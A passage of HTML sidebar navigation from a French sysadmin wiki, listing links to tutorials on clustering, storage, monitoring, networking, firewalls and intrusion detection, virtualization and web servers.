href=https://wiki.deimos.fr/UploadTool_:_Mise_en_place_d%27un_outil_d%27%C3%A9change_de_fichiers_via_Apache/>UploadTool: Setting up a file sharing tool via Apache</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/AutoFS_:_montage_et_d%C3%A9montage_de_partages/>AutoFS: Mounting and Unmounting Shares</a></li></ul></div></li><li class="sidebar-dropdown nested"><button class=btn>
High Availability</button><div class=sidebar-submenu><ul><li class="sidebar-dropdown nested"><button class=btn>
HA-Proxy</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/haproxy-load-balance-your-traffic/>HAProxy: Load Balance Your Traffic</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Load_Balancing_et_Fail_Over_pour_les_services_Web/>Load Balancing and Fail Over for Web Services</a></li></ul></div></li><li class="sidebar-dropdown nested"><button class=btn>
Heartbeat</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Installation_et_configuration_d%5C%27un_cluster_Heartbeat_V2/>Installation and Configuration of a Heartbeat V2 Cluster</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Installation_et_configuration_d%27un_cluster_Heartbeat_V1/>Installation and Configuration of a Heartbeat V1 Cluster</a></li></ul></div></li><li class="sidebar-dropdown nested"><button class=btn>
KeepAlived</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Pound_:_Installation_et_Configuration_d%27un_Reverse_Proxy/>Pound: Installation and Configuration of a Reverse Proxy</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Installation_et_Configuration_de_KeepAlived/Pound_avec_Failover_et_support_de_session/>Installation and Configuration of KeepAlived/Pound with Failover and Session Support</a></li></ul></div></li><li class="sidebar-dropdown nested"><button class=btn>
Red Hat Cluster Suite</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Installation_et_Configuration_de_Red_Hat_Cluster_Suite/>Installation and Configuration of Red Hat Cluster Suite</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Installation_d%5C%27un_cluster_Red_Hat_4/>Installing a Red Hat 4 Cluster</a></li></ul></div></li><li class="sidebar-dropdown nested"><button class=btn>
Storage</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Ceph_:_performance,_reliability_and_scalability_storage_solution/>Ceph: Performance, Reliability and Scalability Storage Solution</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Installation_et_configuration_de_DRBD/>Installation and Configuration of DRBD</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/GFS2_:_Le_Filesystem_Cluster_de_Red_Hat/>GFS2: Red Hat Cluster Filesystem</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/OCFS2%C2%A0:%C2%A0Le_FileSystem_Cluster_d%27Oracle/>OCFS2: Oracle's Cluster File System</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/glusterfs-ha-cluster-filesystem/>GlusterFS: High Availability Cluster Filesystem</a></li></ul></div></li><li class="sidebar-dropdown nested"><button class=btn>
Sun Cluster</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Installation_et_configuration_du_SUN_Cluster/>Installation and Configuration of SUN Cluster</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Mise_en_place_d%27un_quorum_server/>Setting up a quorum server</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Installation_of_Sun_Cluster_%28old%29/>Installation of Sun Cluster</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Upgrader_SUN_Cluster/>Upgrading SUN Cluster</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Introduction_et_Architechture_de_mise_en_place_d%27un_Cluster_SUN/>Introduction and Architecture of Setting Up a SUN Cluster</a></li></ul></div></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Load_balancer_plusieurs_connections_WAN/>Load Balancing Multiple WAN Connections</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Installation_et_Configuration_de_Pacemaker/>Installation and Configuration of Pacemaker</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Autoriser_rapidement_un_utilisateur_%C3%A0_avoir_acc%C3%A8s_aux_commandes_cluster/>Quickly Grant User Access to Cluster Commands</a></li></ul></div></li><li class="sidebar-dropdown nested"><button class=btn>
Misc</button><div class=sidebar-submenu><ul><li class="sidebar-dropdown nested"><button class=btn>
Hardware</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Multipath_:_configurer_plusieurs_chemins_pour_ses_acc%C3%A8s_disques_externe/>Multipath: Configuring Multiple Paths for External Disk Access</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Migrer_de_Multipath_%C3%A0_Powerpath_sur_RedHat/>Migrating from Multipath to Powerpath on RedHat</a></li></ul></div></li><li class="sidebar-dropdown nested"><button class=btn>
Instant mesaging</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/OpenFire_:_Installation_d%27OpenFire/>OpenFire: Installation of OpenFire</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/EJabberd_:_Mise_en_place_d%27un_serveur_Jabber_%28messagerie_instantan%C3%A9e%29/>EJabberd: Setting up a Jabber server (instant messaging)</a></li></ul></div></li><li class="sidebar-dropdown nested"><button class=btn>
NTP</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/NTP_:_Cr%C3%A9ation_d%27un_serveur_NTP/>NTP: Creating an NTP Server</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/OpenNTPd_:_Mise_en_place_d%27un_serveur_NTP_sous_OpenBSD/>OpenNTPd: Setting up an NTP server on OpenBSD</a></li></ul></div></li><li class="sidebar-dropdown nested"><button class=btn>
Remote install</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Satellite_:_D%C3%A9ploiement_d%27OS_Red_Hat_via_Red_Hat_Satellite/>Satellite: Deploying Red Hat OS via Red Hat Satellite</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/TFTP_:_PXE_Serveur,_d%C3%A9ploiement_d%27OS_sous_Linux/>TFTP: PXE Server, OS Deployment under Linux</a></li></ul></div></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Seafile:%C2%A0make%C2%A0your%C2%A0personal%C2%A0storage%C2%A0cloud%C2%A0easily/>Seafile: Make Your Personal Storage Cloud Easily</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Firefox_Sync_Server_create_your_own_Sync_Server/>Firefox Sync Server: Create Your Own Sync Server</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Sphinx_:_setup_a_full_text_indexer/>Sphinx: Setup a Full Text Indexer</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Firefox_mass_management_on_Windows/>Firefox: Mass Management on Windows Environment</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Rancid_Search_:_Mise_en_place_d%27un_outil_de_recherche_pour_Rancid/>Rancid Search: Setting Up a Search Tool for Rancid</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Cups_:_mise_en_place_d%27un_serveur_d%27impression/>CUPS: Setting Up a Print Server</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/MediaTomb_:_Mise_en_place_d%27un_serveur_multim%C3%A9dia_%28UPnP%29/>MediaTomb: Setting up a multimedia (UPnP) server</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/asterisk-mise-en-place-d-asterisk-pbx-et-web-based-provisioning-gui/>Asterisk: Setting up Asterisk PBX and Web-Based Provisioning GUI</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Asterisk_:_Mise_en_place_d%27Asterisk_PBX_et_Web-Based_Provisioning_GUI/>Asterisk: Setting up Asterisk PBX and Web-Based Provisioning GUI</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/OCS_Inventory_:_Mise_en_place_d%27un_inventaire_de_parc_automatique/>OCS Inventory: Setting up Automatic Network Inventory</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Mise_en_place_dun_Watchdog/>Setting up a Watchdog</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Monter_un_Hotspot_Wifi/>Setting up a WiFi Hotspot</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/architecture-de-base-avec-asterisk-et-freephonie/>Basic Architecture with Asterisk and Freephonie</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/AvantFax_:_Mise_en_place_d%27un_serveur_de_Fax_HylaFax_avec_AvantFax/>AvantFax: Setting Up a HylaFax Server with AvantFax</a></li></ul></div></li><li class="sidebar-dropdown nested"><button class=btn>
Monitoring</button><div class=sidebar-submenu><ul><li class="sidebar-dropdown nested"><button class=btn>
Cacti</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/create-your-own-graphs/>Create Your Own Graphs</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/installation_et_configuration_de_cacti/>Installation and Configuration of Cacti</a></li></ul></div></li><li class="sidebar-dropdown nested"><button class=btn>
Collectd</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Observium_:_Une_interface_%C3%A9volu%C3%A9e_pour_Collectd/>Observium: An Advanced Interface for Collectd</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Visage_:_Une_interface_web_pour_Collectd/>Visage: A Web Interface for Collectd</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Collectd_:_Installation_et_configuration_de_Collectd/>Collectd: Installation and Configuration</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Heymon_:_Une_interface_web_pour_Collectd/>Heymon: A Web Interface for Collectd</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Jarmon_:_Une_interface_web_pour_Collectd/>Jarmon: A Web Interface for Collectd</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Collection3_:_Une_interface_web_pour_Collectd/>Collection3: A Web Interface for Collectd</a></li></ul></div></li><li class="sidebar-dropdown nested"><button class=btn>
Logging</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Fluentd:_quickly_search_in_your_logs_with_Elasticsearch,_Kibana_and_Fluentd/>Fluentd: Quickly Search in Your Logs with Elasticsearch, Kibana and Fluentd</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Syslog-ng_:_Installation_et_configuration_de_Syslog-ng/>Syslog-ng: Installation and Configuration of Syslog-ng</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Rsyslog_:%C2%A0Installation_et_configuration_d%27Rsyslog/>Rsyslog: Installation and Configuration</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Php-syslog-ng_:_Interpr%C3%A9tation_des_logs_Syslog-ng_dans_une_interfa%C3%A7e_web/>PHP-syslog-ng: Interpretation of Syslog-ng logs in a web interface</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Tenshi_:_Analyse_des_logs_syst%C3%A8me/>Tenshi: System Log Analysis</a></li></ul></div></li><li class="sidebar-dropdown nested"><button class=btn>
Munin</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/monit-easily-use-triggers-on-your-system/>Monit: Easily Use Triggers on Your System</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Munin_:_Surveiller_ses_serveurs_de_fa%C3%A7ons_tr%C3%A8s_simple/>Munin: Monitor your servers in a very simple way</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Monitorer_Windows_avec_Munin/>Monitoring Windows with Munin</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Monit_et_Munin_:_Surveiller_avec_Munin_et_%C3%AAtre_alert%C3%A9_avec_Monit/>Monit and Munin: Monitor with Munin and Get Alerts with Monit</a></li></ul></div></li><li class="sidebar-dropdown nested"><button class=btn>
Nagios</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Nagios_:_Installation_et_configuration/>Nagios: Installation and Configuration</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Emails_r%C3%A9capitulatif_des_alertes_Nagios_en_cours/>Email Summary of Current Nagios Alerts</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Mise_en_place_dune_solution_de_monitoring_%C3%A9clat%C3%A9_avec_Nagios_CheckMK_et_Thruk/>Setting up a distributed monitoring solution with Nagios, CheckMK and Thruk</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Thruk_:_Une_interface_%C3%A9volu%C3%A9e_pour_Nagios_et_MKlivestatus/>Thruk: An Advanced Interface for Nagios and MKlivestatus</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Check_MK_:_Collecter_facilement_des_infos_Nagios_et_%C3%A9tendez_ses_possibilit%C3%A9s/>Check MK: Easily collect Nagios information and extend its capabilities</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/PNP4Nagios:_Grapher_ses_alertes_Nagios/>PNP4Nagios: Graph Your Nagios Alerts</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Nagios_:_Am%C3%A9liorer_le_look_des_emails_de_notification/>Nagios: Improving the Look of Notification Emails</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/NDOUtils_:_Envoyer_les_%C3%A9tats_en_base_de_donn%C3%A9e/>NDOUtils: Sending States to a Database</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/NagVis:_Cartographier_son_architecture_avec_ses_alertes_nagios/>NagVis: Map Your Architecture with Nagios Alerts</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Nagios_:_2_Load_Balancing/>Nagios: 2 Load Balancing</a></li></ul></div></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/glances-all-in-one-monitoring-shell-tool/>Glances: All in One Monitoring Shell Tool</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Shinken_:_Installation_et_configuration_du_successeur_de_Nagios/>Shinken: Installation and Configuration of Nagios' Successor</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/MRTG_:_Monitoring_ax%C3%A9_r%C3%A9seau/>MRTG: Network-Focused Monitoring</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/SNMP_:_Le_protocole_de_gestion_r%C3%A9seaux/>SNMP: The Network Management Protocol</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Mailgraph%C2%A0:%C2%A0Surveillance%C2%A0des%C2%A0mails%C2%A0%28Spams,%C2%A0rejects,%C2%A0virus...%29>Mailgraph: Email Monitoring (Spam, Rejects, Viruses...)</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/RRDtool_:_cr%C3%A9er_ses_propre_graphiques_avec_RRDtool/>RRDtool: Create Your Own Graphics with RRDtool</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Weathermap4RRD_:_faire_des_cartes_de_monitoring/>Weathermap4RRD: Creating Monitoring Maps</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Installation_et_configuration_d%27un_serveur_Centreon/>Installation and Configuration of a Centreon Server</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Oreon_:_Mise_en_place_d%27une_solution_simplifi%C3%A9e_et_plus_%C3%A9l%C3%A9gante_pour_Nagios/>Oreon: Setting up a simplified and more elegant solution for Nagios</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Smokeping_:_Monitorer_la_latence/>Smokeping: Monitoring Latency</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Xen_et_vserver_:_monitoring_des_VM_sur_une_page_PHP/>Xen and vserver: monitoring VMs on a PHP page</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Watchdog_:_d%C3%A9tection_de_probl%C3%A8mes_hardware/>Watchdog: Hardware Problem Detection</a></li></ul></div></li><li class="sidebar-dropdown nested"><button class=btn>
Network</button><div class=sidebar-submenu><ul><li class="sidebar-dropdown nested"><button class=btn>
DHCP</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/DHCP_:_Installation_et_configuration_d%27un_serveur_DHCP/>DHCP: Installation and Configuration of a DHCP Server</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Mise_en_place_d%27un_DHCP_Failover/>Setting up DHCP Failover</a></li></ul></div></li><li class="sidebar-dropdown nested"><button class=btn>
VPN</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/OpenVPN_:_Mise_en_place_d%27OpenVPN_sur_diff%C3%A9rentes_plateformes/>OpenVPN: Setting up OpenVPN on different platforms</a></li></ul></div></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Mise_en_place_de_VLAN/>Setting up VLAN</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/NTOP:_Installation_et_configuration_d%27NTOP_%28Network_TOP%29/>NTOP: Installation and Configuration of NTOP (Network TOP)</a></li></ul></div></li><li class="sidebar-dropdown nested"><button class=btn>
Security</button><div class=sidebar-submenu><ul><li class="sidebar-dropdown nested"><button class=btn>
Iptables</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Les_commandes_de_bases_d%5C%27Iptables/>Basic IPTables Commands</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Exemples_de_configurations/>Iptables: Configuration Examples</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Lancer_les_r%C3%A8gles_de_Firewalling_avant_que_les_interfaces_deviennent_up/>Launch Firewall Rules Before Interfaces Come Up</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Nfqueue_:_Filtrer_des_milliers_d%27adresses_IP_%28ex:_par_pays%29/>Nfqueue: Filter Thousands of IP Addresses (e.g., by Country)</a></li></ul></div></li><li class="sidebar-dropdown nested"><button class=btn>
Packet Filter</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Introduction_%C3%A0_Packet_Filter/>Introduction to Packet Filter</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Packet_Filter:_Lutter_contre_le_bruteforce/>Packet Filter: Fighting Against Brute Force Attacks</a></li></ul></div></li><li class="sidebar-dropdown nested"><button class=btn>
Snort</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Introduction_aux_IDS_et_%C3%A0_SNORT/>Introduction to IDS and SNORT</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Mise_en_place_de_Snort_%5C&_BASE_%28Basic_Analysis_and_Security_Engine%29/>Setting up Snort & BASE (Basic Analysis and Security Engine)</a></li></ul></div></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Create_a_PKI/>Create a PKI</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Bani%C3%A8res_:_Cacher_les_bani%C3%A8res_de_ses_applications_%28Service_banner_faking%29/>Banners: Hiding Application Banners (Service Banner Faking)</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Rinetd_:_Forwarder_simplement_et_rapidement_vers_d%27autres_machines/>Rinetd: Simply and Quickly Forward to Other Machines</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Stunnel_:_Fabrication_d%27un_tunnel_SSL/>Stunnel: Creating an SSL Tunnel</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Rkhunter_:_D%C3%A9tection_de_rootkits_et_malwares/>Rkhunter: Detection of rootkits and malware</a></li></ul></div></li><li class="sidebar-dropdown nested"><button class=btn>
Versionning</button><div class=sidebar-submenu><ul><li class="sidebar-dropdown nested"><button class=btn>
CVS</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Installation_et_configuration_de_CVS/>CVS Installation and Configuration</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/CVS_:_Utilisation_de_CVS/>CVS: Using CVS</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Mise_en_place_des_ACLs_pour_CVS/>Setting up ACLs for CVS</a></li></ul></div></li><li class="sidebar-dropdown nested"><button class=btn>
Git</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Mise_en_place_d%27un_serveur_et_client_Git/>Setting Up a Git Server and Client</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Gitweb_:_Installation_et_configuration_d%27une_interface_web_pour_git/>Gitweb: Installation and configuration of a web interface for git</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Nginx_Git_et_Gitweb/>Nginx Git and Gitweb</a></li></ul></div></li><li class="sidebar-dropdown nested"><button class=btn>
SVN</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Installation_et_configuration_d%5C%27un_repository_SVN/>Installation and Configuration of an SVN Repository</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/SVK_:_Cr%C3%A9er_un_mirroir_en_lecture_pour_SVN/>SVK: Creating a Read-Only Mirror for SVN</a></li></ul></div></li></ul></div></li><li class="sidebar-dropdown nested"><button class=btn>
Virtualization</button><div class=sidebar-submenu><ul><li class="sidebar-dropdown nested"><button class=btn>
KVM & Qemu</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/KVM_:_Mise_en_place_de_KVM/>KVM: Setting Up KVM</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Convertir_une_image_disque_Vmware_pour_Qemu_ou_Xen/>Converting a VMware Disk Image for Qemu or Xen</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Migration_Xen_vers_KVM/>Migrating from Xen to KVM</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Qemu_:_Installation_de_Windows/>QEMU: Windows Installation</a></li></ul></div></li><li class="sidebar-dropdown nested"><button class=btn>
XenServer</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Mise_en_place_de_Xen/>Setting up Xen</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/XenServer_5.0_:_Astuces/>XenServer 5.0: Tips & Tricks</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/XenServer_5.0_:_Configuration_d%27un_XenServer_avec_du_mat%C3%A9riel_SUN/>XenServer 5.0: Configuring XenServer with SUN Hardware</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/XenServer_4.1_:_Changer_l%27interface_de_Management/>XenServer 4.1: Changing the Management Interface</a></li></ul></div></li><li class="sidebar-dropdown nested"><button class=btn>
XenSource</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Convertion_dimages_Vmware_vers_Xen/>Converting VMware Images to Xen</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Ganeti_:_Management_d%27un_Cluster_Xen/>Ganeti: Xen Cluster Management</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Xen_convertion_P2V/>Xen Conversion P2V</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Xen_avec_Bonding_+_Vlan_Tagging/>Xen with Bonding + VLAN Tagging</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Port_forwarding_depuis_dom0_vers_bridged_domU_avec_IPVS/>Port forwarding from dom0 to bridged domU with IPVS</a></li></ul></div></li></ul></div></li><li class="sidebar-dropdown nested"><button class=btn>
Web</button><div class=sidebar-submenu><ul><li class="sidebar-dropdown nested"><button class=btn>
Apache</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Theme_pour_le_Directory_Index_Listing_d%5C%27Apache/>Theme for Apache Directory Index Listing</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Proxy:%C2%A0Cr%C3%A9er_un_proxy_avec_Apache/>Proxy: Creating a proxy with Apache</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Monitorer_en_temps_r%C3%A9el_votre_Apache/>Real-time monitoring of your Apache server</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Installation_et_configuration_d%5C%27Apache_2/>Apache 2 Installation and Configuration</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Mixing_Apache_Authentication/>Mixing Apache Authentication</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/WebDav_:_S%C3%A9curiser_avec_SSL/>WebDAV: Securing with SSL</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Memcached_:_Mise_en_place_d%27un_serveur_de_cache_pour_Apache/>Memcached: Setting up a Cache Server for Apache</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Mise_en_place_de_certificats_SSL_sous_Apache_2/>Setting up SSL certificates with Apache 2</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/S%C3%A9curiser_Apache_avec_mod_security/>Securing Apache with mod_security</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Slotlimit_:_Module_d%27apache_pour_limiter_les_ressources_d%27Apache/>Slotlimit: Apache Module to Limit Apache Resources</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Geolocalisation_avec_Apache_2/>Geolocation with Apache 2</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Load_Balancing_avec_Apache_2/>Load Balancing with Apache 2</a></li></ul></div></li><li class="sidebar-dropdown nested"><button class=btn>
Caches</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Varnish_:_un_acc%C3%A9l%C3%A9rateur_de_site_web/>Varnish: a website accelerator</a></li></ul></div></li><li class="sidebar-dropdown nested"><button class=btn>
Lighttpd</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Lighttpd_:_Installation_et_configuration_d%27une_alternative_d%27Apache/>Lighttpd: Installation and configuration of an Apache alternative</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Webdav_avec_Lighttpd/>WebDAV with Lighttpd</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Mise_en_place_d%27OpenSSL_avec_Lighttpd/>Setting up OpenSSL with Lighttpd</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Vlogger_:_Splitter_les_logs_de_Lighttpd_avec_creation_de_statistiques/>Vlogger: Splitting Lighttpd logs with statistics generation</a></li></ul></div></li><li class="sidebar-dropdown nested"><button class=btn>
Nginx</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Nginx_:_Installation_et_configuration_d%27une_alternative_d%27Apache/>Nginx: Installation and Configuration as an Apache Alternative</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/NAXSI:_integrate_a_WAF_for_Nginx/>NAXSI: Integrate a WAF for Nginx</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Page_Speed:_optimize_on_the_fly_your_rendered_code/>PageSpeed: Optimize Your Rendered Code On The Fly</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Nginx_%20_Varnish_:_Cache_even_in_HTTPS_by_offloading_SSL/>Nginx + Varnish: Cache even in HTTPS by offloading SSL</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Http_substitutions_filter_:_multiple_filters_with_regex_on_response_bodies/>HTTP Substitutions Filter: Multiple Filters with Regex on Response Bodies</a></li></ul></div></li><li class="sidebar-dropdown nested"><button class=btn>
Proxy</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/TinyProxy:_Mise_en_place_d%27un_proxy_simple_et_rapide/>TinyProxy: Setting up a Simple and Fast Proxy</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Squid_:_Installation_et_configuration_de_Squid/>Squid: Installation and Configuration of Squid</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/SafeSquid_:_Mise_en_place_d%27un_proxy_filtrant_le_contenu/>SafeSquid: Setting Up a Content Filtering Proxy</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/SafeSquid_:_Coupler_avec_ClamAV_pour_filtrer_les_virus_sur_le_traffic_entrant/>SafeSquid: Coupling with ClamAV to Filter Viruses on Incoming Traffic</a></li></ul></div></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/G%C3%A9rer_des_certificats_SSL_sign%C3%A9s_par_une_autorit%C3%A9_de_certification/>Managing SSL Certificates Signed by a Certificate Authority</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Tomcat_:_Mise_en_place_d%27un_serveur_Tomcat/>Tomcat: Setting up a Tomcat server</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Benchmarker_son_site_web/>Benchmark Your Website</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Selenium_:_Automatisation_de_t%C3%A2ches_pour_environnements_web/>Selenium: Task Automation for Web Environments</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/V%C3%A9rifier_la_s%C3%A9curit%C3%A9_de_son_site_web_avec_Nikto/>Checking Your Website Security with Nikto</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Symfony_:_Installation_et_configuration_du_framework_PHP/>Symfony: Installation and Configuration of the PHP Framework</a></li><li><a class=sidebar-nested-link 